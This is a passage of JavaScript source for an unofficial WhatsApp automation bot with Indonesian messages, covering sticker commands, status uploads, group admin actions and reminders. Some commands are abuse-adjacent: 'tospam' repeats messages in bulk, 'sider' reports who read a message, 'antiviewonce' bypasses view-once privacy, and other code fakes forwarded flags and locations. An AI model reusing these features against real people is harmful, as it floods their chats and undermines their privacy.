ใ${prefix}text3d teks

ใ${prefix}warrior teks
`
sendButMessage(from, menu, ` ๐๐ณ๐ฆ๐ข๐ต๐ฆ๐ฅ ๐๐บ Katashi ใท๏ธ`, [
          {
            buttonId: `${prefix}command`,
            buttonText: {
              displayText: `โฌก BACK TO MENU `,
            },
            type: 1,
          },]);
break
case 'katalog':
      list = await itsmevall.prepareMessageFromContent(from, {
    "listMessage": {
      "title": "PAYMENT",
      "description": "CLICK",
      "buttonText": "",
      "listType": "PRODUCT_LIST",
      "productListInfo": {
        "productSections": [
          {
            "title": "LIST CATALOG",
            "products": [
              {
                "productId": "4120139628109348"
              },
              {
              	"productId": "6431678466857362"
              },
              {
              	"productId": "4392524570816732"
              }
            ]
          }
        ],
        "headerImage": {
          "productId": "4120139628109348",
          "jpegThumbnail": iye
        },
        "businessOwnerJid": sender
      },
      "footerText": " ๐๐ณ๐ฆ๐ข๐ต๐ฆ๐ฅ ๐๐บ Katashi ใท๏ธ"
    }
  }, {quoted: freply})
  itsmevall.relayWAMessage(list, {waitForAck: true})
       
case 'triggered':
                case 'Triggered':
                if (isImage || isQuotedImage) {
                    let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                    let media = await itsmevall.downloadAndSaveMediaMessage(encmedia)
                    var tolink = await uptotele(media)
                let ane = await getBuffer(`https://some-random-api.ml/canvas/triggered?avatar=${tolink}`)
                fs.writeFileSync('./sticker/triggered.webp', ane)
                exec(`webpmux -set exif ./sticker/data.exif ./sticker/triggered.webp -o ./sticker/triggered.webp`, async (error) => {
                    if (error) return reply(mess.error.api)
                    itsmevall.sendMessage(from, fs.readFileSync(`./sticker/triggered.webp`), sticker, {quoted: freply})
                    
                    fs.unlinkSync(`./sticker/triggered.webp`)	
                })
                }
            
                break
  break
case 'script':
		case 'sc':
		case 'sourcecode':
		itsmevall.sendMessage(from, { text: "-", matchedText: 'nopee', description: "", title: "Ngapain Om?", jpegThumbnail: iye }, 'extendedTextMessage', { detectLinks: false, contextInfo: { forwardingScore: 508, isForwarded: true}, quoted: finv})
		break
      //------------------< Sticker Cmd >-------------------
      case "addcmd":
      case "setcmd":
      case "Addcmd":
      case "Setcmd":
        if (isQuotedSticker) {
          if (!q)
            return reply(`Penggunaan : ${command} cmdnya dan tag stickernya`);
          var kodenya =
            mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString(
              "base64"
            );
          addCmd(kodenya, q);
          fakestatus("Done!");
        } else {
          reply("tag stickenya");
        }
        break;
	case 'upswteks':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (args.length < 1) return reply('Teksnya?')
                    teks = body.slice(10)
                    itsmevall.sendMessage('status@broadcast', teks, MessageType.text)
                    reply(`Sukses upload status:\n${teks}`)
                    break	
                    case 'upswlokasi':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
  if (args.length < 1) return reply('Teksnya?')
                    teks = body.slice(12)
                    itsmevall.sendMessage('status@broadcast', {degreesLatitude: 24.121231, degreesLongitude: 55.1121221, name:teks,address:`${fakeyoi}`}, MessageType.location)
                    reply(`Sukses upload lokasi:\n${teks}`)
                    break	
                    case 'upswsticker':
                    if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (!isQuotedSticker) return reply('Reply stikernya!')
if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await itsmevall.downloadMediaMessage(encmedia)
						itsmevall.sendMessage('status@broadcast', buff, sticker)
						}
						reply(`Sukses upload sticker`)
                    break
                     case 'upswaudio':
                    if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (!isQuotedAudio) return reply('Reply audionya!')
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await itsmevall.downloadMediaMessage(encmedia)
						itsmevall.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400})
						}
						reply(`Sukses upload audio`)
						break
						case 'upswvoice':
                    if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (!isQuotedAudio) return reply('Reply audionya!')
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await itsmevall.downloadMediaMessage(encmedia)
						itsmevall.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt: true})
						}
						reply(`Sukses upload voice`)
						break
case 'upswvideo':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                    var konti = body.slice(11)
                    reply(mess.wait)
                    var enmediap = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					var mediap = await itsmevall.downloadAndSaveMediaMessage(enmediap)
                    const buffer3 = fs.readFileSync(mediap)
                    itsmevall.sendMessage('status@broadcast', buffer3, MessageType.video, {duration: 359996400, caption: `${konti}`})
                    reply(`Sukses upload video:\n${konti}`)
                        break
                           case 'upswgif':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                    var konti = body.slice(7)
                    reply(mess.wait)
                    enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await itsmevall.downloadAndSaveMediaMessage(enmedia)
                    const buffer6 = fs.readFileSync(media)
                    itsmevall.sendMessage('status@broadcast', buffer6, MessageType.video, {mimetype : 'video/gif', caption: `${konti}`})
                    reply(`Sukses upload gif:\n${konti}`)
                        break
                        case 'upswimage':
                        if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                    var teksyy = body.slice(11)
                    reply(mess.wait)
                    enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await itsmevall.downloadAndSaveMediaMessage(enmedia)
                    buffer = fs.readFileSync(media)
                    itsmevall.sendMessage('status@broadcast', buffer, MessageType.image, {quoted: mek, caption: `${teksyy}`})
                    reply(`Sukses upload image:\n${teksyy}`)
                        break
					case 'shutdown':
					if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
				return itsmevall.sendMessage(from, JSON.stringify(eval(process.exit())))
				reply('Okey')
				break
      case "delcmd":
      case "Delcmd":
        if (!isQuotedSticker)
          return reply(`Penggunaan : ${command} tagsticker`);
        var kodenya =
          mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString(
            "base64"
          );
        _scommand.splice(getCommandPosition(kodenya), 1);
        fs.writeFileSync("./database/scommand.json", JSON.stringify(_scommand));
        fakestatus("Done!");
        break;
      case "listcmd":
      case "Listcmd":
        teksnyee = `\`\`\`ใ LIST STICKER CMD ใ\`\`\``;
        cemde = [];
        for (let i of _scommand) {
          cemde.push(i.id);
          teksnyee += `\n\nโธ *ID :* ${i.id}\nโธ *Cmd* : ${i.chats}`;
        }
        mentions(teksnyee, cemde, true);
        break;
        // banchat fixed by itsmevall
case 'banchat':
case 'Banchat':
if (!isGroup) return reply(mess.only.group)
if (!itsMe && !isOwner && !isGroupAdmins)return mentions(`*Perintah ini Khusus @${ownerN} !*`, [`${ownerN}@s.whatsapp.net`], true)
//if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (isBanchat) return reply(`udah di ban`)
bancht.push(from)
fs.writeFileSync('./database/banchat.json', JSON.stringify(bancht))
reply(`Bot berhasil Ban di group ini`)
break

case 'unbanchat':
case 'Unbanchat':
if (!itsMe && !isOwner)return reply(mess.only.ownerB)
if (!isBanchat) return reply(`udah di UnBan`)
let ubc = bancht.indexOf(from)
bancht.splice(ubc, 1)
fs.writeFileSync('./database/banchat.json', JSON.stringify(bancht))
reply(`Bot telah di Unban di group ini`)
break

case 'listbanchat': case 'listbc':
 teks = `*List Banchat Group!*\n_Total : ${bancht.length}_\n\n`
for(let i of bancht){
met = await itsmevall.groupMetadata(i)
teks += 'Id : ' + i + '\n'
teks += 'Nama Group : ' + met.subject + '\n\n'
}
reply(teks)
break
      case "antilink":
      case "Antilink":
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return reply("Khusus admin");
        if (args[0] == "on") {
          if (isAntilink) return reply("Sudah aktif!!");
          antilink.push(from);
          fs.writeFileSync(
            "./database/antilink.json",
            JSON.stringify(antilink)
          );
          reply("Sukses mengaktifkan antilink!");
        } else if (args[0] == "off") {
          antilink.splice(from, 1);
          fs.writeFileSync(
            "./database/antilink.json",
            JSON.stringify(antilink)
          );
          reply("Sukses mematikan antilink!");
        } else if (!q) {
          sendButMessage(from, `MODE ANTILINK`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}antilink on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}antilink off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;
      case "antihidetag":
      case "Antihidetag":
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return reply("Khusus admin");
        if (args[0] == "on") {
          if (isAntihidetag) return reply("Sudah aktif!!");
          antihidetg.push(from);
          fs.writeFileSync(
            "./database/antihidetag.json",
            JSON.stringify(antihidetg)
          );
          reply("Sukses mengaktifkan antihidetag!");
        } else if (args[0] == "off") {
          antihidetg.splice(from, 1);
          fs.writeFileSync(
            "./database/antihidetag.json",
            JSON.stringify(antihidetg)
          );
          reply("Sukses mematikan antihidetag!");
        } else if (!q) {
          sendButMessage(
            from,
            `MODE ANTIHIDETAG`,
            `Silahkan pilih salah satu`,
            [
              {
                buttonId: `${prefix}antihidetag on`,
                buttonText: {
                  displayText: `on`,
                },
                type: 1,
              },
              {
                buttonId: `${prefix}antihidetag off`,
                buttonText: {
                  displayText: `off`,
                },
                type: 1,
              },
            ]
          );
        }
        break;
      case "antiviewonce":
      case "Antiviewonce":
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return reply("Khusus admin");
        if (args[0] == "on") {
          if (isAntiviewonce) return reply("Sudah aktif!!");
          antivo.push(from);
          fs.writeFileSync("./database/antivo.json", JSON.stringify(antivo));
          reply("Sukses mengaktifkan antiviewonce!");
        } else if (args[0] == "off") {
          antivo.splice(from, 1);
          fs.writeFileSync("./database/antivo.json", JSON.stringify(antivo));
          reply("Sukses mematikan antiviewonce!");
        } else if (!q) {
          sendButMessage(
            from,
            `MODE ANTIVIEWONCE`,
            `Silahkan pilih salah satu`,
            [
              {
                buttonId: `${prefix}antiviewonce on`,
                buttonText: {
                  displayText: `on`,
                },
                type: 1,
              },
              {
                buttonId: `${prefix}antiviewonce off`,
                buttonText: {
                  displayText: `off`,
                },
                type: 1,
              },
            ]
          );
        }
        break;
       case 'autoketik':
       case 'Autoketik':
if (!isOwner && !mek.key.fromMe) return
if (args.length < 1) return reply('Pilih on atau off')
if (args[0] === "on") {
if (autoketik === true) return
autoketik = true
reply(`Succes mengaktifkan autoketik`)
} else if (args[0] === "off") {
if (autoketik === false) return
autoketik = false
reply(`Succes mematikan autoketik`)
} else {
reply(`Pilih on atau off`)
}
break
case 'autovn':
if (!isOwner && !mek.key.fromMe) return
if (args.length < 1) return reply('Pilih on atau off')
if (args[0] === "on") {
if (autovn === true) return
autovn = true
reply(`Succes mengaktifkan autovn`)
} else if (args[0] === "off") {
if (autovn === false) return
autovn = false
reply(`Succes mematikan autovn`)
} else {
reply(`Pilih on atau off`)
}
break
case 'anticall':
case 'Anticall':
if (!isOwner && !itsMe) return
if (args.length < 1) return reply('Pilih on atau off')
if (args[0] === "on") {
if(antical)return reply('Sudah diaktifkan sebelumnya!')
antical = true
reply(`Succes mengaktifkan anticall`)
} else if (args[0] === "off") {
if(!antical)return reply('Sudah di NonAktifkan sebelumnya!')
antical = false
reply(`Succes mematikan anticall`)
} else {
reply(`Pilih on atau off`)
}
break

case 'autoread':
case 'Autoread':
if (args.length < 1) return reply(`Example:\n${prefix}autoread gc on`)
if (args[0] === "gc") {
if (args.length < 2) return reply(`Example:\n${prefix}autoread gc on`)
if (args[1] === "on") {
if (readGc === true) return
readGc = true
reply(`Succes mengaktifkan autoread group`)
} else if (args[1] === "off") {
if (readGc === false) return
readGc = false
reply(`Succes mematikan autoread group`)
} else {
reply(`Pilih on atau off`)
}
} else if (args[0] === "pc") {
if (args.length < 2) return reply(`Example:\n${prefix}autoread pc on`)
if (args[1] === "on") {
if (readPc === true) return
readPc = true
reply(`Succes mengaktifkan autoread pc`)
} else if (args[1] === "off") {
if (readPc === false) return
readPc = false
reply(`Succes mematikan autoread pc`)
} else {
reply(`Pilih on atau off`)
}
} else {
reply(`*List Auto Read*\nโข> gc\nโข> pc`)
}
break
      case "autojoin":
      case "Autojoin":
        if (!isGroup) return reply("Khusus di grup");
        if (!mek.key.fromMe) return reply("Khusus owner");
        if (args[0] == "on") {
          if (autojoin == true) return reply("Sudah aktif!!");
          autojoin = true;
          reply("Sukses mengaktifkan autojoin!");
        } else if (args[0] == "off") {
          autojoin = false;
          reply("Sukses mematikan autojoin!");
        } else if (!q) {
          sendButMessage(from, `MODE AUTOJOIN`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}autojoin on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}autojoin off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;
      case "antivirtex":
      case "Antivirtex":
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return reply("Khusus admin");
        if (args[0] == "on") {
          if (isAntivirtex) return reply("Sudah aktif!!");
          antivirtex.push(from);
          fs.writeFileSync(
            "./database/antivirtex.json",
            JSON.stringify(antivirtex)
          );
          reply("Sukses mengaktifkan antivirtex!");
        } else if (args[0] == "off") {
          antivirtex.splice(from, 1);
          fs.writeFileSync("./database/antivirtex.json", JSON.stringify(ant));
          reply("Sukses mematikan antivirtex!");
        } else if (!q) {
          sendButMessage(from, `MODE ANTIVIRTEX`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}antivirtex on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}antivirtex off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;
      case "kickarea":
      case "Kickarea":
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return reply("Khusus admin");
        if (args[0] == "on") {
          if (isKickarea) return reply("Sudah aktif!!");
          kickarea.push(from);
          fs.writeFileSync(
            "./database/antibule.json",
            JSON.stringify(kickarea)
          );
          reply("Sukses mengaktifkan kickarea!");
        } else if (args[0] == "off") {
          kickarea.splice(from, 1);
          fs.writeFileSync(
            "./database/antibule.json",
            JSON.stringify(kickarea)
          );
          reply("Sukses mematikan kickarea!");
        } else if (!q) {
          sendButMessage(from, `MODE KICKAREA`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}kickarea on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}kickarea off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;

      //------------------< Fitur Grup >-------------------
      case "listonline": 
      case "Listonline": 
        let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat;
        try {
          let online = [
            ...Object.keys(itsmevall.chats.get(id).presences),
            itsmevall.user.jid,
          ];
          itsmevall.reply(
            m.chat,
            "โโใ Daftar Online ใ\n" +
              online.map((v) => "โ @" + v.replace(/@.+/, "")).join`\n` +
              "\nโโโโโ",
            m,
            {
              contextInfo: { mentionedJid: online },
            }
          );
         } catch (e) {
          m.reply("");
        }
        break;
      case "sider":
      case "Sider":
        if (!m.quoted) throw `Balas pesan bot!`;
        let members = m.quoted.chat.endsWith("g.us")
          ? (await itsmevall.groupMetadata(m.quoted.chat)).participants.length - 1
          : m.quoted.chat.endsWith("@broadcast")
          ? -1
          : 1;
        let { reads, deliveries } = await itsmevall.messageInfo(
          m.quoted.chat,
          m.quoted.id
        );
        let txt = `
*Dibaca oleh:*
${reads
  .sort((a, b) => b.t - a.t)
  .map(({ jid, t }) => `@${jid.split`@`[0]}\n_${formatDate(t * 1000)}_`)
  .join("\n")}
${members > 1 ? `${members - reads.length} tersisa` : ""}

*Terkirim ke:*
${deliveries
  .sort((a, b) => b.t - a.t)
  .map(({ jid, t }) => `${jid.split`@`[0]}\n_${formatDate(t * 1000)}_`)
  .join("\n")}
${members > 1 ? `${members - reads.length - deliveries.length} tersisa` : ""}
`.trim();
        m.reply(txt, null, {
          contextInfo: {
            mentionedJid: itsmevall.parseMention(txt),
          },
        });
        break;
      case "q":
        if (!m.quoted) return reply("reply message!");
        let qse = itsmevall.serializeM(await m.getQuotedObj());
        if (!qse.quoted)
          return reply("the message you replied does not contain a reply!");
        await qse.quoted.copyNForward(m.chat, true);
        break;
      case "kick":
      case "Kick":
        if (!isGroup) return reply(mess.only.group);
        if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin);
        if (!isBotGroupAdmins) return reply("Bot not admin");
        if (
          mek.message.extendedTextMessage === undefined ||
          mek.message.extendedTextMessage === null
        )
          return reply("Tag target yang ingin di kick!");
        mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid;
        if (mentioned.length > 1) {
          itsmevall.groupRemove(from, mentioned);
          reply(mess.success);
        } else if (mentioned.length < 1) {
          anu = mek.message.extendedTextMessage.contextInfo.participant;
          itsmevall.groupRemove(from, [anu]);
          reply(mess.success);
        } else {
          itsmevall.groupRemove(from, mentioned);
          reply(mess.success);
        }
        break;
      case "add":
      case "Add":
        if (!isGroup) return reply(mess.only.group);
        if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin);
        if (!isBotGroupAdmins) return reply("Bot not admin");
        mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid;
        if (mentioned.length > 1) {
          add(from, mentioned);
          reply(mess.success);
        } else if (mentioned.length < 1) {
          anu = mek.message.extendedTextMessage.contextInfo.participant;
          itsmevall.groupAdd(from, [anu]);
          reply(mess.success);
        } else {
          add(from, mentioned);
          reply(mess.success);
        }
        break;
case 'igstory': 
case 'Igstory': 
            if(!q) return reply('Usernamenya?')
            hx.igstory(q)
            .then(async result => {
            for(let i of result.medias){
                if(i.url.includes('mp4')){
                    let link = await getBuffer(i.url)
                    itsmevall.sendMessage(from,link,video,{quoted: mek,caption: `Type : ${i.type}`})
                } else {
                    let link = await getBuffer(i.url)
                    itsmevall.sendMessage(from,link,image,{quoted: mek,caption: `Type : ${i.type}`})                  
                }
            }
            });
            break
case 'linkwa':
case 'Linkwa':
            if(!q) return reply('cari group apa?')
            hx.linkwa(q)
            .then(result => {
            let res = '*ใ _LINK WA_ ใ*\n\n'
            for (let i of result) {
            res += `*Nama*: *${i.nama}\n*Link*: ${i.link}\n\n`
            }
            reply(res)
            });
            break
      case "getbio":
      case "Getbio":
        var yy = mek.message.extendedTextMessage.contextInfo.participant;
        var p = await itsmevall.getStatus(`${yy}`, MessageType.text);
        reply(p.status);
        if (p.status == 401) {
          reply("Status Profile Not Found");
        }
        break;
      // Get Name
      case "getname":
      case "Getname":
        var ambl = mek.message.extendedTextMessage.contextInfo.participant;
        const sname =
          itsmevall.contacts[ambl] != undefined
            ? itsmevall.contacts[ambl].sname || itsmevall.contacts[ambl].notify
            : undefined;
        reply(sname);
        break;
      case "setdesc":
      case "Setdesc":
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Admin Group Only");
        if (!isBotGroupAdmins) return reply("Bot not admin");
        if (!isGroup) return;
        itsmevall.groupUpdateDescription(from, `${args.join(" ")}`);
        itsmevall.sendMessage(from, "Succes change description group", text, {
          quoted: mek,
        });
        break;
      // Set Name Group
      case "setname":
      case "Setname":
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Admin Group Only");
        if (!isBotGroupAdmins) return reply("Bot not admin");
        if (!isGroup) return;
        itsmevall.groupUpdateSubject(from, `${args.join(" ")}`);
        itsmevall.sendMessage(from, "Succes change name group", text, {
          quoted: mek,
        });
        break;
      // Group Info
      case "groupinfo":
      case "Groupinfo":
        if (!isGroup) return;
        ppUrl = await itsmevall.getProfilePicture(from); // leave empty to get your own
        buffergbl = await getBuffer(ppUrl);
        itsmevall.sendMessage(from, buffergbl, image, {
          quoted: mek,
          caption: `\`\`\`ใ Group Info ใ\`\`\`\n*โข> Name* : ${groupName}\n*โข> Member* : ${groupMembers.length}\n*โข> Admin* : ${groupAdmins.length}\n*โข> Description* : \n${groupDesc}`,
        });
        break;
      // Demote Admins
      case "demote":
      case "Demote":
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Admin Group Only");
        if (!isGroup) return;
        if (!isBotGroupAdmins) return reply("Bot not admin");
        if (
          mek.message.extendedTextMessage === undefined ||
          mek.message.extendedTextMessage === null
        )
          return reply("Reply members");
        mentionede = mek.message.extendedTextMessage.contextInfo.participant;
        itsmevall.groupDemoteAdmin(from, [mentionede]);
        teks = `Members @${mentionede.split("@")[0]} succes demote`;
        itsmevall.sendMessage(from, teks, text, {
          quoted: mek,
          contextInfo: { mentionedJid: [mentionede] },
        });
        break;
      // Promote Members
      case "promote":
      case "Promote":
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Admin Group Only");
        if (!isGroup) return;
        if (!isBotGroupAdmins) return reply("Bot not admin");
        if (
          mek.message.extendedTextMessage === undefined ||
          mek.message.extendedTextMessage === null
        )
          return reply("Reply members");
        mentionede = mek.message.extendedTextMessage.contextInfo.participant;
        itsmevall.groupMakeAdmin(from, [mentionede]);
        teks = `Members @${mentionede.split("@")[0]} succes promote`;
        itsmevall.sendMessage(from, teks, text, {
          quoted: mek,
          contextInfo: { mentionedJid: [mentionede] },
        });
        break;
      case "closegc":
      case "CLosegc":
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Only admin");
        if (!isBotGroupAdmins) return reply("Bot not admin");
        if (!isGroup) return;
        reply(`*SUCCES CLOSE GROUP*`);
        itsmevall.groupSettingChange(from, GroupSettingChange.messageSend, true);
        break;
case 'tospam':
case 'Tospam':
if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length > 10) {
teks = body.slice(8)
oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('Kebanyakan!')
if (!Number(oi2)) return reply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  itsmevall.sendMessage(from, `${oi1}`, MessageType.text)
	  }
} else if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length < 10) {
teks = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  itsmevall.sendMessage(from, teks, MessageType.text)
	  }
} else if (isQuotedSticker) {
	encmedian = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	         median = await itsmevall.downloadAndSaveMediaMessage(encmedian)
				anu = fs.readFileSync(median)
	if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  itsmevall.sendMessage(from, anu, sticker)
	  }
} else if (isQuotedAudio) {
	encmediat = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	            mediat = await itsmevall.downloadAndSaveMediaMessage(encmediat)
				anu = fs.readFileSync(mediat)
	if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  itsmevall.sendMessage(from, anu, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt:true})
	  }
} else if (isQuotedImage) {
	boij = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
	delb = await itsmevall.downloadMediaMessage(boij)
	teks = body.slice(6)
	oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('Kebanyakan!')
	if (!Number(oi2)) return reply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  itsmevall.sendMessage(from, delb, MessageType.image, {caption: oi1})
	  }
}
	  break
      case "revoke":
      case "Revoke":
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Only admin");
        if (!isBotGroupAdmins) return reply("Bot not admin");
        if (!isGroup) return;
        itsmevall.revokeInvite(from);
        reply("```Succes revoke link group```");
        break;
      case "opengc":
      case "Opengc":
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Only admin");
        if (!isBotGroupAdmins) return reply("Bot not admin");
        if (!isGroup) return;
        reply(`*SUCCES OPEN GROUP*`);
        itsmevall.groupSettingChange(from, GroupSettingChange.messageSend, false);
        break;
      case "reminder": // by Slavyan
      case "Reminder": // by Slavyan
        if (!q)
          return reply(
            `CONTOH PENGGUNANNYA:\n${prefix}reminder text/2s\n\nNOTE: \n*s* - seconds\n*m* - minutes\n*h* - hours\n*d* - days`
          );
        teks = body.slice(10);
        const messRemind = teks.split("/")[0];
        const timeRemind = teks.split("/")[1];
        typeRemind = "Text";
        if (isQuotedImage) typeRemind = "Image";
        if (isQuotedSticker) typeRemind = "Sticker";
        if (isQuotedAudio) typeRemind = "Audio";
        if (!isQuotedImage && !isQuotedAudio && !isQuotedSticker)
          typeRemind = "Text";
        const parsedTime = ms(toMs(timeRemind));
        reminder.addReminder(
          sender,
          messRemind,
          typeRemind,
          timeRemind,
          _reminder
        );
        if (!isQuotedImage && !isQuotedSticker && !isQuotedAudio) {
          await itsmevall.sendMessage(
            from,
            `โโ ใ REMINDER ใ โโ
    
Reminder berhasil diaktifkan!
โธ Pesan: ${messRemind}
โธ Type: Text
โธ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
โธ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              anu = await reminder.getReminderMsg(sender, _reminder);
              itsmevall.sendMessage(
                from,
                `โโ ใ REMINDER ใ โโ

โฐ @${sender.split("@")[0]} โฐ
โธ Pesan: ${messRemind}
โธ Type: ${reminder.getReminderType(sender, _reminder)}`,
                text,
                { contextInfo: { mentionedJid: [sender] } }
              );
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        } else if (isQuotedSticker) {
          encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
            .message.extendedTextMessage.contextInfo;
          media = await itsmevall.downloadAndSaveMediaMessage(encmedia);
          await itsmevall.sendMessage(
            from,
            `โโ ใ REMINDER ใ โโ
    
Reminder berhasil diaktifkan!
โธ Pesan: ${messRemind}
โธ Type: Sticker
โธ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
โธ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              anu = await reminder.getReminderMsg(sender, _reminder);
              itsmevall.sendMessage(
                from,
                `โโ ใ REMINDER ใ โโ

โฐ @${sender.split("@")[0]} โฐ
โธ Pesan: ${messRemind}
โธ Type: ${reminder.getReminderType(sender, _reminder)}`,
                text,
                { contextInfo: { mentionedJid: [sender] } }
              );
              itsmevall.sendMessage(from, fs.readFileSync(media), sticker);
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        } else if (isQuotedImage) {
          encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          media = await itsmevall.downloadAndSaveMediaMessage(encmedia);
          await itsmevall.sendMessage(
            from,
            `โโ ใ REMINDER ใ โโ
    
Reminder berhasil diaktifkan!
โธ Pesan: ${messRemind}
โธ Type: Image
โธ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
โธ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              anu = await reminder.getReminderMsg(sender, _reminder);
              teks = `โโ ใ REMINDER ใ โโ

โฐ @${sender.split("@")[0]} โฐ
โธ Pesan: ${messRemind}
โธ Type: ${reminder.getReminderType(sender, _reminder)}`;
              itsmevall.sendMessage(from, media, image, {
                contextInfo: { mentionedJid: [sender] },
                caption: teks,
              });
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        } else if (isQuotedAudio) {
